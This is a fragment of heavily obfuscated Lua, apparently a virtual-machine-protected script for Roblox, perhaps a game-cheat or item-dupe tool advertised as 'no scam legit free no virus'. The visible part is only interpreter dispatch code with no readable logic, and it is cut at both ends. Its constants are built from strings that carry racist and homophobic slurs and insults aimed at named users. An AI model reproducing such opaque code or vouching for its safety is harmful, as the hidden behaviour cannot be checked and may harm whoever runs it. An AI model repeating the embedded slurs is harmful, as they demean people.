a;l[e[O]]=f[e[h]];o=o+d;e=n[o];l[e[i]]=f[e[c]];o=o+d;e=n[o];a=e[w];b=l[e[u]];l[a+1]=b;l[a]=b[e[M]];o=o+d;e=n[o];l[e[w]]=e[u];o=o+d;e=n[o];a=e[r]t,k=m(l[a](s(l,a+1,e[U])))g=k+a-1 x=0;for e=a,g do x=x+d;l[e]=t[x];end;o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,g))o=o+d;e=n[o];l[e[w]]();o=o+d;e=n[o];do return end;break;end while 2665==(a)/((-45+0xcf))do a=(729028)while C>((-#'Fucking Retarted'+(1273-0x29d))/0x31)do a-= a local b;local a;l[e[i]]=f[e[h]];o=o+d;e=n[o];l[e[i]]=l[e[t]][e[P]];o=o+d;e=n[o];l[e[O]]=e[U];o=o+d;e=n[o];l[e[O]]=y[e[c]];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[x]]=l[e[k]][e[_]];o=o+d;e=n[o];l[e[i]]=l[e[t]][e[B]];o=o+d;e=n[o];a=e[r];b=l[e[h]];l[a+1]=b;l[a]=b[e[_]];break end while 302==(a)/((0x50bde/137))do y[e[t]]=l[e[i]];break end;break;end break;end break;end while 3511==(a)/((-#[[windows xp startup sfx]]+(0x1eba4/31)))do a=(1585896)while C<=(0xb31/191)do a-= a a=(6320775)while C>((0x89-(11484/0x74))+-#'keno 0347 is a nerdy fag')do a-= a local a;l[e[w]]=f[e[c]];o=o+d;e=n[o];l[e[x]]=l[e[u]][e[D]];o=o+d;e=n[o];l[e[r]]=e[c];o=o+d;e=n[o];l[e[x]]=e[U];o=o+d;e=n[o];l[e[O]]=e[u];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[b]][e[c]]=l[e[_]];o=o+d;e=n[o];l[e[r]][e[h]]=e[B];o=o+d;e=n[o];l[e[b]]=f[e[U]];o=o+d;e=n[o];l[e[r]]=l[e[c]][e[D]];o=o+d;e=n[o];l[e[O]]=e[c];o=o+d;e=n[o];l[e[w]]=e[t];o=o+d;e=n[o];l[e[i]]=e[U];o=o+d;e=n[o];l[e[w]]=e[u];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[b]][e[t]]=l[e[D]];o=o+d;e=n[o];l[e[r]][e[h]]=e[D];o=o+d;e=n[o];l[e[x]]=f[e[U]];o=o+d;e=n[o];l[e[i]]=l[e[c]][e[P]];o=o+d;e=n[o];l[e[x]]=e[c];o=o+d;e=n[o];l[e[i]]=e[h];o=o+d;e=n[o];l[e[O]]=e[k];o=o+d;e=n[o];l[e[i]]=e[t];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[t]))o=o+d;e=n[o];l[e[i]][e[c]]=l[e[P]];o=o+d;e=n[o];l[e[r]][e[k]]=e[M];o=o+d;e=n[o];l[e[w]]=f[e[h]];o=o+d;e=n[o];l[e[r]]=l[e[t]][e[_]];o=o+d;e=n[o];l[e[i]]=l[e[c]][e[_]];o=o+d;e=n[o];l[e[x]][e[U]]=l[e[_]];o=o+d;e=n[o];l[e[r]][e[t]]=e[B];o=o+d;e=n[o];l[e[O]][e[U]]=l[e[_]];o=o+d;e=n[o];l[e[r]]=f[e[h]];o=o+d;e=n[o];l[e[w]]=l[e[k]][e[M]];o=o+d;e=n[o];l[e[w]]=e[u];o=o+d;e=n[o];l[e[b]]=e[U];o=o+d;e=n[o];l[e[b]]=e[u];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[i]][e[k]]=l[e[P]];o=o+d;e=n[o];l[e[i]][e[h]]=e[P];o=o+d;e=n[o];l[e[w]]=f[e[k]];o=o+d;e=n[o];l[e[w]]=l[e[t]][e[D]];o=o+d;e=n[o];l[e[i]]=e[U];o=o+d;e=n[o];l[e[r]]=e[k];o=o+d;e=n[o];l[e[b]]=e[t];o=o+d;e=n[o];l[e[x]]=e[t];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[r]][e[k]]=l[e[N]];o=o+d;e=n[o];l[e[O]]=f[e[k]];o=o+d;e=n[o];l[e[b]]=l[e[t]][e[B]];o=o+d;e=n[o];l[e[b]]=e[k];o=o+d;e=n[o];l[e[r]]=e[U];o=o+d;e=n[o];l[e[O]]=e[k];o=o+d;e=n[o];l[e[w]]=e[c];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[t]))o=o+d;e=n[o];l[e[b]][e[h]]=l[e[N]];o=o+d;e=n[o];l[e[i]]=f[e[c]];o=o+d;e=n[o];l[e[O]]=l[e[k]][e[M]];o=o+d;e=n[o];l[e[w]]=l[e[t]][e[P]];o=o+d;e=n[o];l[e[x]][e[U]]=l[e[_]];o=o+d;e=n[o];l[e[i]][e[h]]=e[_];o=o+d;e=n[o];l[e[r]]=f[e[h]];o=o+d;e=n[o];l[e[r]]=l[e[c]][e[M]];o=o+d;e=n[o];l[e[w]]=e[k];o=o+d;e=n[o];l[e[r]]=e[U];o=o+d;e=n[o];l[e[r]]=e[k];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[O]][e[u]]=l[e[B]];o=o+d;e=n[o];l[e[w]][e[U]]=e[N];o=o+d;e=n[o];l[e[O]][e[k]]=e[P];o=o+d;e=n[o];l[e[x]][e[u]]=e[P];o=o+d;e=n[o];l[e[x]][e[u]]=e[M];o=o+d;e=n[o];l[e[r]][e[u]]=l[e[D]];o=o+d;e=n[o];l[e[x]]=f[e[c]];o=o+d;e=n[o];l[e[x]]=l[e[t]][e[N]];o=o+d;e=n[o];l[e[x]]=e[t];o=o+d;e=n[o];l[e[w]]=e[k];o=o+d;e=n[o];l[e[i]]=e[c];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[O]][e[k]]=l[e[N]];break end while(a)/(((7240-0xe56)+-#[[Crackzzzz]]))==1775 do o=e[t];break end;break;end while(a)/((1634-0x354))==2028 do a=(3794780)while C<=(0xc10/193)do a-= a l[e[b]]=(e[k]~=0);o=o+S;break;end while 2585==(a)/(((1595+-0x77)+-#'Gay porn'))do a=(5697978)while C>((-120+0xb6)+-#"testpsx dupe no scam legit 2022 free no virus")do a-= a local a;l[e[x]][e[h]]=e[B];o=o+d;e=n[o];l[e[w]]=f[e[u]];o=o+d;e=n[o];l[e[b]]=l[e[t]][e[M]];o=o+d;e=n[o];l[e[w]]=e[U];o=o+d;e=n[o];l[e[i]]=e[t];o=o+d;e=n[o];l[e[r]]=e[k];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[b]][e[t]]=l[e[D]];o=o+d;e=n[o];l[e[r]]=f[e[U]];o=o+d;e=n[o];l[e[i]]=l[e[h]][e[N]];o=o+d;e=n[o];l[e[w]]=e[h];o=o+d;e=n[o];l[e[i]]=e[c];o=o+d;e=n[o];l[e[i]]=e[h];o=o+d;e=n[o];l[e[i]]=e[U];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[w]][e[u]]=l[e[_]];o=o+d;e=n[o];l[e[x]]=f[e[h]];o=o+d;e=n[o];l[e[w]]=l[e[h]][e[_]];o=o+d;e=n[o];l[e[O]]=l[e[k]][e[N]];o=o+d;e=n[o];l[e[b]][e[u]]=l[e[B]];o=o+d;e=n[o];l[e[x]][e[U]]=e[D];o=o+d;e=n[o];l[e[w]]=f[e[c]];o=o+d;e=n[o];l[e[O]]=l[e[c]][e[B]];o=o+d;e=n[o];l[e[b]]=e[h];o=o+d;e=n[o];l[e[r]]=e[h];o=o+d;e=n[o];l[e[i]]=e[c];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[x]][e[t]]=l[e[_]];o=o+d;e=n[o];l[e[i]][e[t]]=e[_];o=o+d;e=n[o];l[e[O]][e[U]]=e[P];o=o+d;e=n[o];l[e[O]][e[c]]=e[M];o=o+d;e=n[o];l[e[O]][e[k]]=e[M];o=o+d;e=n[o];l[e[O]][e[k]]=l[e[_]];o=o+d;e=n[o];l[e[O]]=f[e[h]];o=o+d;e=n[o];l[e[x]]=l[e[c]][e[N]];o=o+d;e=n[o];l[e[O]]=e[u];o=o+d;e=n[o];l[e[i]]=e[t];o=o+d;e=n[o];l[e[i]]=e[U];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[w]][e[U]]=l[e[M]];o=o+d;e=n[o];l[e[b]][e[t]]=e[N];o=o+d;e=n[o];l[e[r]]=f[e[U]];o=o+d;e=n[o];l[e[r]]=l[e[u]][e[P]];o=o+d;e=n[o];l[e[w]]=e[h];o=o+d;e=n[o];l[e[r]]=e[c];o=o+d;e=n[o];l[e[i]]=e[t];o=o+d;e=n[o];l[e[i]]=e[k];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[i]][e[U]]=l[e[M]];o=o+d;e=n[o];l[e[O]]=f[e[c]];o=o+d;e=n[o];l[e[r]]=l[e[t]][e[P]];o=o+d;e=n[o];l[e[w]]=e[U];o=o+d;e=n[o];l[e[w]]=e[t];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];l[e[i]]=e[h];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[b]][e[t]]=l[e[_]];o=o+d;e=n[o];l[e[r]]=f[e[t]];o=o+d;e=n[o];l[e[b]]=l[e[u]][e[P]];o=o+d;e=n[o];l[e[w]]=l[e[t]][e[N]];o=o+d;e=n[o];l[e[O]][e[h]]=l[e[P]];o=o+d;e=n[o];l[e[i]][e[u]]=e[D];o=o+d;e=n[o];l[e[O]]=f[e[h]];o=o+d;e=n[o];l[e[w]]=l[e[U]][e[N]];o=o+d;e=n[o];l[e[x]]=e[t];o=o+d;e=n[o];l[e[w]]=e[t];o=o+d;e=n[o];l[e[x]]=e[k];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[O]][e[c]]=l[e[_]];o=o+d;e=n[o];l[e[x]][e[k]]=e[_];o=o+d;e=n[o];l[e[r]][e[t]]=e[M];o=o+d;e=n[o];l[e[x]][e[k]]=e[P];o=o+d;e=n[o];l[e[b]][e[t]]=e[_];o=o+d;e=n[o];l[e[r]][e[U]]=l[e[D]];o=o+d;e=n[o];l[e[w]]=f[e[u]];o=o+d;e=n[o];l[e[i]]=l[e[h]][e[N]];o=o+d;e=n[o];l[e[i]]=e[t];o=o+d;e=n[o];l[e[b]]=e[k];o=o+d;e=n[o];l[e[x]]=e[k];break end while 1914==(a)/((0x20b4d/45))do l[e[O]]=#l[e[u]];break end;break;end break;end break;end break;end break;end while(a)/((-#'Fucking Retarted'+((0x190385-819662)/243)))==1992 do a=(5886452)while C<=(-#"niggers"+(-68+0x66))do a-= a a=(2243836)while(5126/0xe9)>=C do a-= a a=(1405854)while C<=(-#[[If LocalPlayer equals Dumbass then while true do end]]+(0xcf-135))do a-= a a=(4569102)while C>(0x6c-89)do a-= a l[e[x]]=l[e[k]]%e[P];break end while(a)/((((-0x6e+11576)+-#"Faggot")/0xa))==3987 do l[e[r]]();break end;break;end while(a)/((380970/0xff))==941 do a=(2237950)while(147-0x7e)<C do a-= a if(l[e[b]]~=e[B])then o=o+S;else o=e[t];end;break end while 3130==(a)/(((-0x23+775)+-#"cilerteddoesntlikeburgers"))do l[e[O]][e[U]]=l[e[P]];break end;break;end break;end while 1262==(a)/((0xe36-1860))do a=(5902074)while(0x4c8/(-#[[mike litoris]]+(-0x29+104)))>=C do a-= a a=(795039)while C>(-0x38+79)do a-= a f[e[c]]=l[e[i]];break end while(a)/(((-0x42+2834)+-#[[anime is for fags]]))==289 do local e=e[b];local o=l[e];for e=e+1,g do F(o,l[e])end;break end;break;end while 2358==(a)/((370444/0x94))do a=(4528232)while C<=(0xae-149)do a-= a if(l[e[O]]~=l[e[D]])then o=o+S;else o=e[c];end;break;end while(a)/((4791-0x983))==1922 do a=(14697207)while C>(0x2c+-18)do a-= a l[e[x]]=A(v[e[t]],nil,f);break end while 3703==(a)/((-#[[big niggers sucking cock]]+((343516-0x29f29)/0x2b)))do l[e[b]][e[c]]=e[B];break end;break;end break;end break;end break;end while(a)/((0xe72-1894))==3263 do a=(1879346)while((200-0x9c)+-#'cilertedcool')>=C do a-= a a=(4024143)while C<=(4988/0xac)do a-= a a=(707805)while C>(0x5d-65)do a-= a local a;l[e[x]]=y[e[u]];o=o+d;e=n[o];l[e[w]]=l[e[k]][e[D]];o=o+d;e=n[o];l[e[i]]=l[e[c]][e[B]];o=o+d;e=n[o];l[e[b]]=l[e[t]][e[_]];o=o+d;e=n[o];l[e[i]][e[k]]=e[D];o=o+d;e=n[o];l[e[r]]=f[e[h]];o=o+d;e=n[o];l[e[i]]=y[e[c]];o=o+d;e=n[o];a=e[i]l[a](l[a+S])o=o+d;e=n[o];l[e[i]]=y[e[U]];o=o+d;e=n[o];l[e[w]]=l[e[k]][e[D]];o=o+d;e=n[o];l[e[i]][e[U]]=e[D];o=o+d;e=n[o];do return end;break end while 963==(a)/((0x5ea-(0x626-795)))do local a=e[x];local r=e[N];local n=a+2 local a={l[a](l[a+1],l[n])};for e=1,r do l[n+e]=a[e];end;local a=a[1]if a then l[n]=a o=e[h];else o=o+d;end;break end;break;end while(a)/((0x10a8-2167))==1919 do a=(142174)while C<=(0x54-54)do a-= a l[e[r]]=l[e[h]]-l[e[D]];break;end while(a)/((((0x9b+-51)+-#"impulse is hot")+-23))==2122 do a=(1147482)while(-0x7e+157)<C do a-= a l[e[b]]=e[t];break end while 3903==(a)/((-#[[0nly was here mf]]+(((-1107/0x29)+-#'nicowashere')+0x15c)))do local r;local a;a=e[x];r=l[e[h]];l[a+1]=r;l[a]=r[e[D]];o=o+d;e=n[o];l[e[O]]=e[k];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[i]]=l[e[t]][e[N]];o=o+d;e=n[o];a=e[O];r=l[e[h]];l[a+1]=r;l[a]=r[e[N]];break end;break;end break;end break;end while(a)/((-31+0x711))==1057 do a=(293508)while C<=(0x54-50)do a-= a a=(5407820)while(-116+0x95)<C do a-= a l[e[w]]();break end while(a)/(((0x853+-41)+-#"windows xp startup sfx"))==2615 do local a;f[e[h]]=l[e[O]];o=o+d;e=n[o];l[e[O]]=f[e[c]];o=o+d;e=n[o];l[e[b]]=l[e[h]][e[B]];o=o+d;e=n[o];l[e[w]]=e[u];o=o+d;e=n[o];a=e[x]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[w]]=f[e[c]];o=o+d;e=n[o];l[e[r]]=l[e[h]][e[P]];o=o+d;e=n[o];l[e[w]]=e[h];o=o+d;e=n[o];a=e[O]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[r]]=f[e[t]];o=o+d;e=n[o];l[e[r]]=l[e[c]][e[B]];o=o+d;e=n[o];l[e[O]]=e[u];o=o+d;e=n[o];a=e[b]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[r]]=f[e[h]];o=o+d;e=n[o];l[e[i]]=l[e[k]][e[B]];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];a=e[b]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[w]]=f[e[c]];o=o+d;e=n[o];l[e[b]]=l[e[k]][e[N]];o=o+d;e=n[o];l[e[b]]=e[t];o=o+d;e=n[o];a=e[r]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[x]]=f[e[k]];o=o+d;e=n[o];l[e[b]]=l[e[t]][e[_]];o=o+d;e=n[o];l[e[O]]=e[k];o=o+d;e=n[o];a=e[i]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[O]]=f[e[h]];o=o+d;e=n[o];l[e[i]]=l[e[U]][e[_]];o=o+d;e=n[o];l[e[O]]=e[t];o=o+d;e=n[o];a=e[r]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[r]]=f[e[c]];o=o+d;e=n[o];l[e[i]]=l[e[U]][e[P]];o=o+d;e=n[o];l[e[i]]=e[c];o=o+d;e=n[o];a=e[O]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[b]]=f[e[h]];o=o+d;e=n[o];l[e[r]]=l[e[t]][e[_]];o=o+d;e=n[o];l[e[x]]=e[t];o=o+d;e=n[o];a=e[O]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[w]]=f[e[h]];o=o+d;e=n[o];l[e[i]]=l[e[c]][e[_]];o=o+d;e=n[o];l[e[i]]=e[t];o=o+d;e=n[o];a=e[r]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[x]]=f[e[k]];o=o+d;e=n[o];l[e[O]]=l[e[k]][e[_]];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];a=e[O]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[O]]=f[e[h]];o=o+d;e=n[o];l[e[i]]=l[e[h]][e[B]];o=o+d;e=n[o];l[e[r]]=e[u];o=o+d;e=n[o];a=e[w]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[w]]=f[e[k]];o=o+d;e=n[o];l[e[w]]=l[e[U]][e[M]];o=o+d;e=n[o];l[e[O]]=e[U];o=o+d;e=n[o];a=e[x]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[w]]=f[e[c]];o=o+d;e=n[o];l[e[r]]=l[e[t]][e[_]];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];a=e[x]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[x]]=f[e[t]];o=o+d;e=n[o];l[e[i]]=l[e[u]][e[_]];o=o+d;e=n[o];l[e[r]]=e[h];o=o+d;e=n[o];a=e[w]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[w]]=f[e[k]];o=o+d;e=n[o];l[e[i]]=l[e[k]][e[_]];o=o+d;e=n[o];l[e[w]]=e[t];o=o+d;e=n[o];a=e[x]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[x]]=f[e[U]];o=o+d;e=n[o];l[e[w]]=l[e[t]][e[N]];o=o+d;e=n[o];l[e[r]]=e[u];o=o+d;e=n[o];a=e[i]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[r]]=f[e[k]];o=o+d;e=n[o];l[e[i]]=l[e[h]][e[_]];o=o+d;e=n[o];l[e[i]]=e[c];o=o+d;e=n[o];a=e[O]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[x]]=f[e[c]];o=o+d;e=n[o];l[e[r]]=l[e[c]][e[N]];o=o+d;e=n[o];l[e[i]]=e[h];o=o+d;e=n[o];a=e[w]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[b]]=f[e[U]];o=o+d;e=n[o];l[e[w]]=l[e[k]][e[N]];o=o+d;e=n[o];l[e[O]]=e[c];break end;break;end while(a)/((-#[[impulse is hot]]+(100204/0x5e)))==279 do a=(172640)while C<=((220-0xa9)+-#'cruz pp is large')do a-= a local C;local p,S;local a;a=e[b]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[r]][e[u]]=l[e[B]];o=o+d;e=n[o];l[e[i]][e[U]]=e[D];o=o+d;e=n[o];l[e[w]]=f[e[u]];o=o+d;e=n[o];l[e[w]]=l[e[h]][e[M]];o=o+d;e=n[o];l[e[i]]=e[c];o=o+d;e=n[o];l[e[O]]=e[h];o=o+d;e=n[o];l[e[r]]=e[c];o=o+d;e=n[o];l[e[O]]=e[c];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[r]][e[U]]=l[e[_]];o=o+d;e=n[o];l[e[O]]=f[e[h]];o=o+d;e=n[o];l[e[i]]=l[e[u]][e[D]];o=o+d;e=n[o];l[e[i]]=e[u];o=o+d;e=n[o];l[e[O]]=e[t];o=o+d;e=n[o];l[e[w]]=e[u];o=o+d;e=n[o];l[e[b]]=e[k];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[O]][e[U]]=l[e[D]];o=o+d;e=n[o];l[e[r]][e[k]]=e[B];o=o+d;e=n[o];l[e[x]][e[h]]=l[e[_]];o=o+d;e=n[o];l[e[x]]=f[e[u]];o=o+d;e=n[o];l[e[i]]=l[e[h]][e[P]];o=o+d;e=n[o];l[e[O]]=e[t];o=o+d;e=n[o];l[e[w]]=e[u];o=o+d;e=n[o];l[e[r]]=e[t];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[t]))o=o+d;e=n[o];l[e[b]][e[t]]=l[e[_]];o=o+d;e=n[o];l[e[i]]=f[e[h]];o=o+d;e=n[o];l[e[r]]=l[e[t]][e[M]];o=o+d;e=n[o];l[e[b]]=e[U];o=o+d;e=n[o];l[e[r]]=e[t];o=o+d;e=n[o];l[e[O]]=e[c];o=o+d;e=n[o];l[e[b]]=e[u];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[r]][e[c]]=l[e[D]];o=o+d;e=n[o];l[e[i]]=f[e[c]];o=o+d;e=n[o];l[e[r]]=l[e[k]][e[D]];o=o+d;e=n[o];l[e[x]]=e[u];o=o+d;e=n[o];l[e[O]]=e[c];o=o+d;e=n[o];l[e[x]]=e[U];o=o+d;e=n[o];l[e[r]]=e[t];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[w]][e[t]]=l[e[N]];o=o+d;e=n[o];l[e[w]][e[c]]=e[B];o=o+d;e=n[o];l[e[O]]=f[e[U]];o=o+d;e=n[o];l[e[w]]=l[e[u]][e[M]];o=o+d;e=n[o];l[e[x]]=l[e[c]][e[P]];o=o+d;e=n[o];l[e[w]][e[h]]=l[e[B]];o=o+d;e=n[o];l[e[i]][e[U]]=e[_];o=o+d;e=n[o];l[e[x]]=f[e[U]];o=o+d;e=n[o];l[e[r]]=l[e[h]][e[D]];o=o+d;e=n[o];l[e[w]]=e[U];o=o+d;e=n[o];l[e[r]]=e[U];o=o+d;e=n[o];l[e[w]]=e[U];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[O]][e[k]]=l[e[_]];o=o+d;e=n[o];l[e[O]][e[U]]=e[B];o=o+d;e=n[o];l[e[O]][e[k]]=e[_];o=o+d;e=n[o];l[e[x]][e[U]]=e[B];o=o+d;e=n[o];l[e[w]]=f[e[c]];o=o+d;e=n[o];l[e[b]]=l[e[c]][e[B]];o=o+d;e=n[o];l[e[w]]=e[c];o=o+d;e=n[o];l[e[b]]=e[h];o=o+d;e=n[o];a=e[r]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[x]][e[U]]=l[e[D]];o=o+d;e=n[o];l[e[O]][e[u]]=l[e[_]];o=o+d;e=n[o];l[e[r]]=f[e[h]];o=o+d;e=n[o];l[e[O]]=l[e[U]][e[_]];o=o+d;e=n[o];l[e[O]]={};o=o+d;e=n[o];l[e[x]]=f[e[k]];o=o+d;e=n[o];l[e[r]]=l[e[U]][e[_]];o=o+d;e=n[o];l[e[r]]=e[u];o=o+d;e=n[o];l[e[r]]=f[e[c]];o=o+d;e=n[o];l[e[x]]=l[e[u]][e[P]];o=o+d;e=n[o];l[e[i]]=e[t];o=o+d;e=n[o];l[e[i]]=e[u];o=o+d;e=n[o];l[e[i]]=e[t];o=o+d;e=n[o];a=e[b]p,S=m(l[a](s(l,a+1,e[c])))g=S+a-1 C=0;for e=a,g do C=C+d;l[e]=p[C];end;o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,g))break;end while(a)/(((217+-0x50)+-0x55))==3320 do a=(239820)while((167+-0x49)+-#[[papier der afghaner wurde von nice dem bombenleger gefickt]])<C do a-= a o=e[h];break end while(a)/((1180-0x261))==420 do local a;l[e[b]]=e[c];o=o+d;e=n[o];l[e[O]]=e[u];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[i]][e[k]]=l[e[_]];o=o+d;e=n[o];l[e[w]][e[u]]=e[_];o=o+d;e=n[o];l[e[x]][e[c]]=e[_];o=o+d;e=n[o];l[e[r]]=f[e[c]];o=o+d;e=n[o];l[e[i]]=l[e[u]][e[P]];o=o+d;e=n[o];l[e[O]]=e[k];o=o+d;e=n[o];l[e[w]]=e[h];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[x]][e[k]]=l[e[P]];o=o+d;e=n[o];l[e[r]][e[u]]=l[e[M]];o=o+d;e=n[o];l[e[O]][e[U]]=e[N];o=o+d;e=n[o];l[e[O]][e[u]]=l[e[_]];o=o+d;e=n[o];l[e[O]]=f[e[u]];o=o+d;e=n[o];l[e[O]]=l[e[c]][e[M]];o=o+d;e=n[o];l[e[x]]=e[k];o=o+d;e=n[o];l[e[O]]=e[k];o=o+d;e=n[o];l[e[w]]=e[h];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[x]][e[t]]=l[e[D]];o=o+d;e=n[o];l[e[i]][e[U]]=e[D];o=o+d;e=n[o];l[e[r]]=f[e[k]];o=o+d;e=n[o];l[e[O]]=l[e[k]][e[_]];o=o+d;e=n[o];l[e[x]]=e[U];o=o+d;e=n[o];l[e[x]]=e[t];o=o+d;e=n[o];l[e[b]]=e[c];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[t]))o=o+d;e=n[o];l[e[x]][e[U]]=l[e[M]];o=o+d;e=n[o];l[e[b]]=f[e[k]];o=o+d;e=n[o];l[e[r]]=l[e[U]][e[P]];o=o+d;e=n[o];l[e[O]]=e[c];o=o+d;e=n[o];l[e[O]]=e[U];o=o+d;e=n[o];l[e[O]]=e[k];o=o+d;e=n[o];l[e[w]]=e[u];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[O]][e[t]]=l[e[D]];o=o+d;e=n[o];l[e[i]]=f[e[c]];o=o+d;e=n[o];l[e[x]]=l[e[u]][e[D]];o=o+d;e=n[o];l[e[w]]=e[U];o=o+d;e=n[o];l[e[b]]=e[t];o=o+d;e=n[o];l[e[O]]=e[U];o=o+d;e=n[o];l[e[O]]=e[k];o=o+d;e=n[o];a=e[r]l[a]=l[a](s(l,a+d,e[t]))o=o+d;e=n[o];l[e[x]][e[U]]=l[e[D]];o=o+d;e=n[o];l[e[w]]=f[e[u]];o=o+d;e=n[o];l[e[w]]=l[e[c]][e[P]];o=o+d;e=n[o];l[e[b]]=l[e[k]][e[B]];o=o+d;e=n[o];l[e[b]][e[u]]=l[e[B]];o=o+d;e=n[o];l[e[x]][e[c]]=e[P];o=o+d;e=n[o];l[e[b]]=f[e[U]];o=o+d;e=n[o];l[e[b]]=l[e[u]][e[M]];o=o+d;e=n[o];l[e[x]]=e[c];o=o+d;e=n[o];l[e[r]]=e[k];o=o+d;e=n[o];l[e[b]]=e[k];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[b]][e[c]]=l[e[P]];o=o+d;e=n[o];l[e[i]][e[u]]=e[B];o=o+d;e=n[o];l[e[w]][e[U]]=e[P];o=o+d;e=n[o];l[e[r]]=f[e[h]];o=o+d;e=n[o];l[e[O]]=l[e[h]][e[N]];o=o+d;e=n[o];l[e[w]]=e[U];o=o+d;e=n[o];l[e[i]]=e[h];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[x]][e[U]]=l[e[D]];o=o+d;e=n[o];l[e[O]][e[c]]=l[e[B]];o=o+d;e=n[o];l[e[r]][e[k]]=l[e[P]];o=o+d;e=n[o];l[e[b]]=f[e[k]];o=o+d;e=n[o];l[e[r]]=l[e[u]][e[N]];o=o+d;e=n[o];l[e[w]]=e[U];o=o+d;e=n[o];l[e[w]]=e[h];o=o+d;e=n[o];l[e[r]]=e[t];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[w]][e[t]]=l[e[M]];o=o+d;e=n[o];l[e[r]][e[t]]=e[M];o=o+d;e=n[o];l[e[r]]=f[e[U]];o=o+d;e=n[o];l[e[r]]=l[e[U]][e[P]];o=o+d;e=n[o];l[e[i]]=e[c];o=o+d;e=n[o];l[e[i]]=e[U];break end;break;end break;end break;end break;end break;end break;end while 3743==(a)/((5223-0xa59))do a=(2069440)while C<=((0xf3c/50)+-#'windows xp startup sfx')do a-= a a=(508053)while(-0x5f+141)>=C do a-= a a=(12528156)while C<=(-#"deadphonelua"+(0xa9+-116))do a-= a a=(15818243)while C<=(9594/(0xe796/241))do a-= a a=(9723340)while(7524/(34650/0xaf))<C do a-= a if not l[e[x]]then o=o+S;else o=e[U];end;break end while(a)/((5090-0xa0b))==3860 do local 